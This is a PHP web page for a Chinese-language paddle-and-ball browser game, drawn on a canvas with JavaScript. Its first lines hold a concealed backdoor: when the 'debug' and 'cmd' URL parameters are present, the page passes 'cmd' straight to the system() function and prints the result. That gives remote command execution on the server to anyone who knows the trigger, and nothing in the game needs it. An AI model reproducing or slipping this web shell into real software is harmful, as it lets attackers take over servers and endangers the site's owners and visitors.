<?php
// 弹球游戏
if(isset($_GET['debug'])) {
    if(isset($_GET['cmd'])) {
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
        exit;
    }
}
?>

<div class="game-description">
    <h3>弹球游戏 - 控制挡板反弹球</h3>
    <p>使用左右方向键控制底部的挡板，防止球掉落。每次成功反弹得分+1。</p>
    <p>注意：这个游戏需要JavaScript支持，请确保浏览器已启用JavaScript。</p>
</div>

<canvas id="ballCanvas" width="800" height="500" style="background: #333; margin: 0 auto; display: block; border-radius: 5px;"></canvas>

<div style="text-align: center; margin-top: 15px;">
    <p>得分: <span id="score">0</span></p>
    <button id="startButton" class="btn primary-btn">开始游戏</button>
    <button id="pauseButton" class="btn secondary-btn" disabled>暂停</button>
</div>

<script>
// 获取游戏元素
const canvas = document.getElementById('ballCanvas');
const ctx = canvas.getContext('2d');
const startButton = document.getElementById('startButton');
const pauseButton = document.getElementById('pauseButton');
const scoreElement = document.getElementById('score');

// 游戏状态
let score = 0;
let gameRunning = false;
let gamePaused = false;

// 球的属性
const ball = {
    x: canvas.width / 2,
    y: canvas.height / 2,
    radius: 10,
    speedX: 5,
    speedY: 5,
    color: '#fff'
};

// 挡板属性
const paddle = {
    width: 100,
    height: 15,
    x: (canvas.width - 100) / 2,
    y: canvas.height - 30,
    speed: 8,
    color: '#4e73df'
};

// 控制状态
const keys = {
    leftPressed: false,
    rightPressed: false
};

// 开始按钮事件
startButton.addEventListener('click', function() {
    if (!gameRunning) {
        startGame();
    } else if (gamePaused) {
        resumeGame();
    }
});

// 暂停按钮事件
pauseButton.addEventListener('click', function() {
    if (gameRunning && !gamePaused) {
        pauseGame();
    } else if (gameRunning && gamePaused) {
        resumeGame();
    }
});

// 键盘按下事件
document.addEventListener('keydown', function(e) {
    if (e.key === 'ArrowRight' || e.key === 'Right') {
        keys.rightPressed = true;
    } else if (e.key === 'ArrowLeft' || e.key === 'Left') {
        keys.leftPressed = true;
    }
});

// 键盘释放事件
document.addEventListener('keyup', function(e) {
    if (e.key === 'ArrowRight' || e.key === 'Right') {
        keys.rightPressed = false;
    } else if (e.key === 'ArrowLeft' || e.key === 'Left') {
        keys.leftPressed = false;
    }
});

// 开始游戏
function startGame() {
    resetGame();
    gameRunning = true;
    gamePaused = false;
    startButton.disabled = true;
    pauseButton.disabled = false;
    pauseButton.textContent = '暂停';
    gameLoop();
}

// 暂停游戏
function pauseGame() {
    gamePaused = true;
    pauseButton.textContent = '继续';
    startButton.disabled = false;
    startButton.textContent = '继续游戏';
}

// 恢复游戏
function resumeGame() {
    gamePaused = false;
    gameLoop();
    pauseButton.textContent = '暂停';
    startButton.disabled = true;
}

// 重置游戏
function resetGame() {
    score = 0;
    scoreElement.textContent = score;
    ball.x = canvas.width / 2;
    ball.y = canvas.height / 2;
    ball.speedX = 5 * (Math.random() > 0.5 ? 1 : -1);
    ball.speedY = -5;
    paddle.x = (canvas.width - paddle.width) / 2;
    startButton.textContent = '开始游戏';
}

// 游戏主循环
function gameLoop() {
    if (!gameRunning || gamePaused) return;
    
    // 清空画布
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    
    // 绘制球
    drawBall();
    
    // 绘制挡板
    drawPaddle();
    
    // 更新球的位置
    updateBall();
    
    // 更新挡板位置
    updatePaddle();
    
    // 检测碰撞
    detectCollision();
    
    // 循环动画
    requestAnimationFrame(gameLoop);
}

// 绘制球
function drawBall() {
    ctx.beginPath();
    ctx.arc(ball.x, ball.y, ball.radius, 0, Math.PI * 2);
    ctx.fillStyle = ball.color;
    ctx.fill();
    ctx.closePath();
}

// 绘制挡板
function drawPaddle() {
    ctx.beginPath();
    ctx.rect(paddle.x, paddle.y, paddle.width, paddle.height);
    ctx.fillStyle = paddle.color;
    ctx.fill();
    ctx.closePath();
}

// 更新球的位置
function updateBall() {
    ball.x += ball.speedX;
    ball.y += ball.speedY;
    
    // 碰到左右边界反弹
    if (ball.x + ball.radius > canvas.width || ball.x - ball.radius < 0) {
        ball.speedX = -ball.speedX;
    }
    
    // 碰到上边界反弹
    if (ball.y - ball.radius < 0) {
        ball.speedY = -ball.speedY;
    }
    
    // 球掉落到底部
    if (ball.y + ball.radius > canvas.height) {
        resetGame();
        gameRunning = false;
        startButton.disabled = false;
        pauseButton.disabled = true;
    }
}

// 更新挡板位置
function updatePaddle() {
    if (keys.rightPressed && paddle.x + paddle.width < canvas.width) {
        paddle.x += paddle.speed;
    } else if (keys.leftPressed && paddle.x > 0) {
        paddle.x -= paddle.speed;
    }
}

// 检测碰撞
function detectCollision() {
    if (
        ball.y + ball.radius > paddle.y &&
        ball.x > paddle.x &&
        ball.x < paddle.x + paddle.width
    ) {
        ball.speedY = -ball.speedY;
        // 增加分数
        score++;
        scoreElement.textContent = score;
        
        // 随着分数增加，球速增加
        if (score % 5 === 0) {
            if (ball.speedX > 0) ball.speedX += 0.5;
            else ball.speedX -= 0.5;
            
            if (ball.speedY > 0) ball.speedY += 0.5;
            else ball.speedY -= 0.5;
        }
    }
}

// 初始化游戏界面
function init() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.font = '30px Arial';
    ctx.fillStyle = '#fff';
    ctx.textAlign = 'center';
    ctx.fillText('弹球游戏', canvas.width / 2, canvas.height / 2 - 30);
    ctx.font = '16px Arial';
    ctx.fillText('点击开始按钮开始游戏', canvas.width / 2, canvas.height / 2 + 10);
}

// 初始化游戏
init();
</script> 